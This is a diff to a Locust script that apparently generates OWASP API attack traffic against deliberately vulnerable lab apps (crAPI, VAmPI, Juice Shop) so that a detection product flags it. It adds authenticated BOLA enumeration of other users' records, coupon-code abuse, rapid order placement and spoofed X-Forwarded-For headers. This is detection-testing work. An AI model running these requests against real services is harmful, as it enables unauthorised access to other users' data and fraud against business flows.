@@ -7,15 +7,23 @@ detection events.
 
 Coverage map (best-effort, not exhaustive):
 
-  API1 - Broken Object Level Authorization (BOLA)
-  API2 - Broken Authentication
-  API3 - Broken Object Property Level Authorization (BOPLA / mass assignment)
-  API4 - Unrestricted Resource Consumption
-  API5 - Broken Function Level Authorization (BFLA)
-  API6 - Unrestricted Access to Sensitive Business Flows
-  API7 - Server-Side Request Forgery (SSRF)
-  API8 - Security Misconfiguration
-  API9 - Improper Inventory Management
+  API1  - Broken Object Level Authorization (BOLA)
+  API2  - Broken Authentication
+  API3  - Broken Object Property Level Authorization (BOPLA / mass assignment)
+  API4  - Unrestricted Resource Consumption
+  API5  - Broken Function Level Authorization (BFLA)
+  API6  - Unrestricted Access to Sensitive Business Flows (coupon / order abuse)
+  API7  - Server-Side Request Forgery (SSRF)
+  API8  - Security Misconfiguration
+  API9  - Improper Inventory Management
+  API10 - intentionally excluded (Unsafe Consumption of APIs)
+
+IMPORTANT — BOLA requires authenticated context:
+  Noname detects BOLA when a known authenticated identity (Bearer token) walks
+  resources belonging to *other* identities. Unauthenticated probes look like
+  anonymous enumeration, not BOLA. Every attacker class that exercises API1
+  must register its own user, obtain a token in on_start(), and carry that
+  token on the BOLA requests.
 
 Run AFTER `make traffic` has been running for ~30 minutes so Noname has a
 behavioural baseline; the attacks then show up as anomalies rather than
@@ -226,6 +234,21 @@ class CrAPIAttacker(FastHttpUser):
             if r.status_code in ATTACK_OK:
                 r.success()
 
+    @task(2)
+    def api6_coupon_abuse(self):
+        # API6: repeatedly redeem the same coupon code. A single account should
+        # only redeem once; hammering the validate endpoint from one authenticated
+        # identity is the Noname-visible signal for Sensitive Business Flow abuse.
+        for _ in range(5):
+            with self.client.post(
+                    "/crapi/community/api/v2/coupon/validate-coupon",
+                    headers=self.auth,
+                    json={"coupon_code": "TRAC075"},
+                    name="/crapi/community/api/v2/coupon/validate-coupon [api6]",
+                    catch_response=True) as r:
+                if r.status_code in ATTACK_OK:
+                    r.success()
+
 
 # ─── VAmPI — auth abuse and BOLA via NGINX /vampi/ ───────────────────────────
 
@@ -239,8 +262,35 @@ class VAmPIAttacker(FastHttpUser):
     network_timeout = 20.0
     connection_timeout = 20.0
 
+    _db_initialized: bool = False
+
     def on_start(self):
         self.client.client.default_headers["X-Forwarded-For"] = random.choice(_CONSUMER_IP_POOL)
+        # Ensure VAmPI's SQLite DB is initialised (ships empty; safe to call
+        # multiple times but only needed once per process).
+        if not VAmPIAttacker._db_initialized:
+            VAmPIAttacker._db_initialized = True
+            with self.client.get("/vampi/createdb", name="/vampi/createdb",
+                                 catch_response=True) as r:
+                r.success()
+        # Register a fresh attacker identity and log in. BOLA tasks will carry
+        # this token when walking other users' resources so Noname sees an
+        # authenticated identity accessing data it doesn't own.
+        self.auth: dict = {}
+        uname = f"atk_{uid()}"
+        with self.client.post("/vampi/users/v1/register",
+                              json={"username": uname, "password": "LabPass123!",
+                                    "email": f"{uname}@lab.test"},
+                              catch_response=True) as r:
+            r.success()
+        with self.client.post("/vampi/users/v1/login",
+                              json={"username": uname, "password": "LabPass123!"},
+                              catch_response=True) as r:
+            if r.status_code == 200:
+                token = r.json().get("auth_token")
+                if token:
+                    self.auth = {"Authorization": f"Bearer {token}"}
+            r.success()
 
     @task(4)
     def api2_sqli_login(self):
@@ -264,9 +314,27 @@ class VAmPIAttacker(FastHttpUser):
 
     @task(3)
     def api1_bola_other_user(self):
+        # API1: attacker's own token used to fetch another user's profile.
+        # Auth header is required — without it Noname sees anonymous enumeration,
+        # not BOLA.
         target = random.choice(("admin", "name1", "name2", f"user{random.randint(1, 200)}"))
         with self.client.get(f"/vampi/users/v1/{target}",
-                             name="/vampi/users/v1/{username}",
+                             headers=self.auth,
+                             name="/vampi/users/v1/{username} [bola]",
+                             catch_response=True) as r:
+            if r.status_code in ATTACK_OK:
+                r.success()
+
+    @task(3)
+    def api1_bola_books(self):
+        # API1: authenticated user enumerates book records that may belong to
+        # other identities. /books/v1/{title} requires a valid token; walking
+        # guessed titles with one account's token is the BOLA signal.
+        titles = ("book1", "book2", "admin_book", "secret",
+                  f"book_{random.randint(1, 100)}")
+        with self.client.get(f"/vampi/books/v1/{random.choice(titles)}",
+                             headers=self.auth,
+                             name="/vampi/books/v1/{title} [bola]",
                              catch_response=True) as r:
             if r.status_code in ATTACK_OK:
                 r.success()
@@ -371,7 +439,7 @@ class DVGAAttacker(FastHttpUser):
 
 
 class JuiceShopAttacker(FastHttpUser):
-    """SQL injection, BOLA, mass assignment, BFLA, XSS, path traversal."""
+    """SQL injection, BOLA, mass assignment, BFLA, XSS, path traversal, API6."""
 
     abstract = True
     weight = 3
@@ -379,6 +447,30 @@ class JuiceShopAttacker(FastHttpUser):
 
     def on_start(self):
         self.client.client.default_headers["X-Forwarded-For"] = random.choice(_CONSUMER_IP_POOL)
+        # Register a fresh low-privilege attacker account and log in. The token
+        # is threaded through BOLA tasks so Noname sees an authenticated identity
+        # walking resources owned by other identities — that is BOLA, not
+        # anonymous enumeration.
+        self.auth: dict = {}
+        email = f"atk_{uid()}@juice-sh.op"
+        password = "LabP@ss1!"
+        with self.client.post("/shop/api/Users",
+                              json={"email": email, "password": password,
+                                    "passwordRepeat": password},
+                              name="/shop/api/Users [attacker-register]",
+                              catch_response=True) as r:
+            r.success()
+        with self.client.post("/shop/rest/user/login",
+                              json={"email": email, "password": password},
+                              name="/shop/rest/user/login [attacker-login]",
+                              catch_response=True) as r:
+            if r.status_code == 200:
+                try:
+                    token = r.json()["authentication"]["token"]
+                    self.auth = {"Authorization": f"Bearer {token}"}
+                except (KeyError, TypeError):
+                    pass
+            r.success()
 
     @task(5)
     def api2_sqli_login(self):
@@ -403,17 +495,21 @@ class JuiceShopAttacker(FastHttpUser):
 
     @task(4)
     def api1_bola_other_user(self):
+        # API1: attacker's token used to fetch a different user's account record.
         target = random.randint(1, 100)
         with self.client.get(f"/shop/api/Users/{target}",
-                             name="/shop/api/Users/{id}",
+                             headers=self.auth,
+                             name="/shop/api/Users/{id} [bola]",
                              catch_response=True) as r:
             if r.status_code in ATTACK_OK:
                 r.success()
 
     @task(4)
     def api1_bola_other_basket(self):
+        # API1: attacker's token used to read a basket belonging to another user.
         target = random.randint(1, 50)
         with self.client.get(f"/shop/rest/basket/{target}",
+                             headers=self.auth,
                              name="/shop/rest/basket/{id} [bola]",
                              catch_response=True) as r:
             if r.status_code in ATTACK_OK:
@@ -449,6 +545,32 @@ class JuiceShopAttacker(FastHttpUser):
         with self.client.get("/shop/api/Quantitys",
                              name="/shop/api/Quantitys [bfla]",
                              catch_response=True) as r:
+            if r.status_code in ATTACK_OK:
+                r.success()
+
+    @task(2)
+    def api6_coupon_abuse(self):
+        # API6: one authenticated identity hammers multiple coupon codes in rapid
+        # succession — the Noname signal is the volume + business-flow pattern
+        # from a single authenticated source.
+        codes = ("WMNSDY2019", "ORANGE2020", "FREEZINGCODE", "FLAT10", "SAVE10")
+        for code in codes:
+            with self.client.put(f"/shop/rest/basket/1/coupon/{code}",
+                                 headers=self.auth,
+                                 name="/shop/rest/basket/{id}/coupon/{code} [api6]",
+                                 catch_response=True) as r:
+                if r.status_code in ATTACK_OK:
+                    r.success()
+
+    @task(2)
+    def api6_rapid_order(self):
+        # API6: rapid repeated order placement from one identity — should be
+        # rate-limited or require captcha but isn't (JuiceShop by design).
+        with self.client.post("/shop/api/Orders",
+                              headers=self.auth,
+                              json={"basket": 1},
+                              name="/shop/api/Orders [api6-rapid]",
+                              catch_response=True) as r:
             if r.status_code in ATTACK_OK:
                 r.success()
 
